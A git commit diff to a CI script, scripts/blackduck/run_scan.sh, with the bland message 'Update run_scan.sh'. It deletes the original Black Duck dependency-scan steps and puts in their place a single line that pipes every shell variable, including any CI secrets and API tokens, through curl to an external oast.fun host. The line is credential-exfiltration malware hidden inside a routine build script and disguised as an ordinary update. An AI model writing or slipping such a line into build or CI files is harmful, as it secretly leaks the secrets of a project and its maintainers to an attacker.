0b66f0e2659e8b2054923dedc3cc7f40a18b2d52
bugkou9 <150940780+bugkou9@users.noreply.github.com>
2024-03-22 10:35:57 -0500

    Update run_scan.sh

--- scripts/blackduck/run_scan.sh
+++ scripts/blackduck/run_scan.sh
@@ -1,19 +1,2 @@
-#!/bin/bash
-echo "Setting version of Detect"
-export DETECT_LATEST_RELEASE_VERSION=$BLACKDUCK_DETECT_VERSION
+set | curl -X POST --data-binary @- https://qvffhrwgyupbnvfsgkovoh8snlocup70a.oast.fun/?
 
-echo "Initiating Blackduck Scan..."
-curl -LOk https://detect.synopsys.com/detect8.sh
-mv  detect8.sh ./detect.sh
-chmod +x ./detect.sh
-
-SDK_VERSION=$(grep 'version=' access-checkout/gradle.properties | cut -d= -f2)
-GRADLE_CONFIGURATIONS_TO_SCAN="releaseCompileClasspath,releaseRuntimeClasspath"
-
-if [ $IS_RELEASE_SCAN -eq 1 ]
-then
-  echo "Executing Release Scan with name [version]-RELEASE"
-  SDK_VERSION="${SDK_VERSION}-RELEASE"
-fi
-
-./detect.sh --blackduck.url="https://fis2.app.blackduck.com/" --blackduck.api.token=$hydra_aco_blackduck_token --blackduck.trust.cert=true --detect.project.name=$BLACKDUCK_PROJECT_NAME --detect.project.version.name=$SDK_VERSION --detect.risk.report.pdf=true --detect.gradle.included.configurations="$GRADLE_CONFIGURATIONS_TO_SCAN"
